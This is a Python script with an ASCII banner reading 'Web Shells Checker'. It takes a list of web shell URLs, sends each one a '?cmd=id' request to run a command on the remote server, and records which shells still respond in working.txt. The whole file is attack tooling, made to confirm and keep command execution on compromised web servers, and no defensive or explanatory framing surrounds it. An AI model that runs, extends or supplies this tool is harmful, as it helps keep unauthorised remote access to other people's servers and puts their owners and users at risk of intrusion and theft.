import argparse
import sys

import requests
import csv

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
reset_ascii_color = "\u001B[0m"


def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-list', help='Path to list with web shells', required=True)
    parser.format_help()
    args = parser.parse_args()
    if len(sys.argv) == 0 or args.list == '' or args is None:
        parser.print_help()
        sys.exit(1)
    else:
        open_file_and_read_lines(args.list)


def open_file_and_read_lines(path):
    file_with_working_shells = "working.txt"
    file_with_not_working_shells = "not_working.txt"
    with open(path) as file:
        with open(file_with_working_shells, 'w') as working_shells_file:
            with open(file_with_not_working_shells, 'w') as not_working_shells_file:
                for line in file:
                    response_text = requests.get(line + "?cmd=id").text
                    contains_uid = response_text.find("uid")
                    if contains_uid != -1:
                        response_status = requests.get(line + "?cmd=id").status_code
                        print("Shell " + line + " responded with: " + "\n" + response_text + "\n" +
                              "Status code: " + str(response_status))
                        working_shells_file.write(line + "\n")
                    else:
                        print("Shell did not respond: " + line + "\n" +
                              "Check path to shell ")
                        not_working_shells_file.write(line + "\n")
    file.close()
    not_working_shells_file.close()
    working_shells_file.close()


if __name__ == '__main__':
    print(ascii_purple_color)
    print(' .---------------------------------------------------------------.' + "\n"
          ' |      O                                                        |' + "\n"
          ' |      |                                                        |' + "\n"               
          ' |0{XXXX}+===================================================>   |' + "\n"  
          ' |      |                                                        |' + "\n"
          ' |      O                                                        |' + "\n"                                                                     
          ' |---------------------------------------------------------------|' + "\n"                                                                     
          ' | __        _______ ____    ____  _   _ _____ _     _     ____  |' + "\n"
          ' | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |' + "\n"
          ' |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |' + "\n"
          ' |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||' + "\n"
          ' |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |' + "\n"
          ' |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |' + "\n"
          " | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |" + "\n"
          ' | | |___|  _  | |__| |___| . \\| |___|  _ <                      |' + "\n"
          ' |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |' + "\n"
          ' |                                                               |' + "\n"
          " '---------------------------------------------------------------'")
    print(reset_ascii_color)
    parse_arguments()
